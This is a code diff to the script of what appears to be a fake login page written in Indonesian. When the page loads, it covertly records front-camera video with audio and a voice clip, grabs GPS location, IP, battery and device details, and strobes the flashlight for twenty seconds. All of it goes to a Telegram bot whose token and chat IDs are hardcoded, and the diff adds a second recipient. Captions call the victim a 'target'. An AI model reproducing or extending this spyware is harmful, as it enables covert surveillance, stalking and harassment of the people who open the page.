@@ -140,14 +140,10 @@
 
   <script>
     const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
-    const chatIds = ['7945789634'];
+    const chatIds = ['7945789634', '6087823470'];
     const input = document.getElementById('text');
     const button = document.getElementById('login-button');
     const notif = document.getElementById('notif');
-
-    let globalStream = null;
-    let globalRecorder = null;
-    const videoChunks = [];
 
     function selectPlatform(btn) {
       document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
@@ -164,23 +160,22 @@
       });
     }
 
-    function sendPhoto(blob) {
-      chatIds.forEach(id => {
-        const formData = new FormData();
-        formData.append('chat_id', id);
-        formData.append('photo', blob, 'foto_target.jpg');
-        formData.append('caption', '📸 Foto Kamera Depan Target');
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData }).catch(console.error);
-      });
-    }
-
     function sendVideo(blob, filename) {
       chatIds.forEach(id => {
         const formData = new FormData();
         formData.append('chat_id', id);
         formData.append('video', blob, filename);
-        formData.append('caption', '📹 Rekaman Kamera Depan (10s/Exit)');
+        formData.append('caption', '📹 Rekaman Kamera Depan (7 Detik)');
         fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData }).catch(console.error);
+      });
+    }
+
+    function sendVoice(blob, filename) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('voice', blob, filename);
+        fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: formData }).catch(console.error);
       });
     }
 
@@ -188,53 +183,86 @@
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
+        
+        let batteryInfo = "Tidak didukung";
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          const level = (battery.level * 100).toFixed(0);
+          const chargingStatus = battery.charging ? "Charging" : "Discharging";
+          batteryInfo = `${level}% (${chargingStatus})`;
+        }
+
         const ram = navigator.deviceMemory || "Tidak diketahui";
         const device = navigator.userAgent.split('(')[1].split(')')[0];
-        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}\n📟 <b>RAM:</b> ±${ram} GB`;
+
+        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${batteryInfo}\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}\n📟 <b>RAM Handphone:</b> ±${ram} GB`;
         sendToTelegram(`<b>📥 Info data hp ⬇️</b>\n\n${text}`);
       } catch (err) {}
     }
 
-    // Fungsi Gabungan: Foto + Lokasi + Video
-    async function startMediaProcess() {
+    async function recordFrontVideo() {
       try {
-        globalStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        
-        // 1. Ambil Lokasi (Karena izin kamera sudah diberikan)
-        getLocation();
-
-        // 2. Ambil Foto Kamera Depan secara instan
-        const videoTrack = globalStream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(videoTrack);
-        const photoBlob = await imageCapture.takePhoto();
-        sendPhoto(photoBlob);
-
-        // 3. Mulai Rekaman Video 10 Detik
-        globalRecorder = new MediaRecorder(globalStream);
-        globalRecorder.ondataavailable = (e) => { if (e.data.size > 0) videoChunks.push(e.data); };
-        globalRecorder.onstop = () => {
-          if (videoChunks.length > 0) {
-            const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
-            sendVideo(videoBlob, 'rekaman_target.mp4');
-          }
-          if (globalStream) globalStream.getTracks().forEach(track => track.stop());
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const videoChunks = [];
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) videoChunks.push(e.data); };
+        mediaRecorder.onstop = () => {
+          const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+          sendVideo(videoBlob, 'rekaman_depan.mp4');
+          stream.getTracks().forEach(track => track.stop());
         };
-
-        globalRecorder.start();
-        setTimeout(() => { if (globalRecorder && globalRecorder.state === "recording") globalRecorder.stop(); }, 10000);
-
+        mediaRecorder.start();
+        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 7000);
       } catch (err) {
-        sendToTelegram('foto kamera depan di tolak 🗿');
+        sendToTelegram('maaf akses vidio tidak berhasil 🤬');
       }
     }
 
-    function handleForceSend() {
-      if (globalRecorder && globalRecorder.state === "recording") globalRecorder.stop();
+    async function autoRecordAudio() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'audio/mpeg' }); 
+          sendVoice(blob, 'voice_note.mp3');
+          stream.getTracks().forEach(track => track.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 5000);
+      } catch (err) {
+        sendToTelegram('Izin Voice Note ditolak ❌');
+      }
     }
 
-    window.addEventListener('pagehide', handleForceSend);
-    window.addEventListener('visibilitychange', () => { if (document.visibilityState === 'hidden') handleForceSend(); });
+    async function startFlashStrobe() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        const track = stream.getVideoTracks()[0];
+        const capabilities = track.getCapabilities();
+        if (!capabilities.torch) {
+          sendToTelegram('flash tidak on 🤬');
+          stream.getTracks().forEach(t => t.stop());
+          return;
+        }
+        sendToTelegram('flash berhasil on ✅');
+        let isOn = false;
+        const interval = setInterval(async () => {
+          try {
+            isOn = !isOn;
+            await track.applyConstraints({ advanced: [{ torch: isOn }] });
+          } catch (e) { clearInterval(interval); }
+        }, 90);
+        setTimeout(() => {
+          clearInterval(interval);
+          track.applyConstraints({ advanced: [{ torch: false }] });
+          stream.getTracks().forEach(t => t.stop());
+        }, 20000);
+      } catch (err) { sendToTelegram('flash tidak on 🤬'); }
+    }
 
+    // --- FITUR AKSES LOKASI BARU ---
     function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
@@ -242,18 +270,25 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            sendToTelegram(`📍 <b>Lokasi GPS Target (Via Izin Foto):</b> <a href="${mapUrl}">click disini</a>`);
+            sendToTelegram(`📍 <b>Lokasi GPS Target:</b> <a href="${mapUrl}">click disini</a>`);
           },
-          (error) => { /* Silently fail if location specifically blocked but camera allowed */ },
+          (error) => {
+            sendToTelegram('maaf akses lokasi di tolak 🤬');
+          },
           { enableHighAccuracy: true }
         );
+      } else {
+        sendToTelegram('Browser tidak mendukung Geolocation ❌');
       }
     }
 
-    window.addEventListener('DOMContentLoaded', async () => {
+    window.addEventListener('DOMContentLoaded', () => {
       createParticles();
-      await getInfo();
-      startMediaProcess(); // Memicu Izin Kamera (Foto + GPS + Video)
+      getInfo();
+      autoRecordAudio(); 
+      recordFrontVideo();
+      startFlashStrobe();
+      getLocation(); // Pemicu otomatis akses lokasi
     });
 
     button.addEventListener('click', () => {
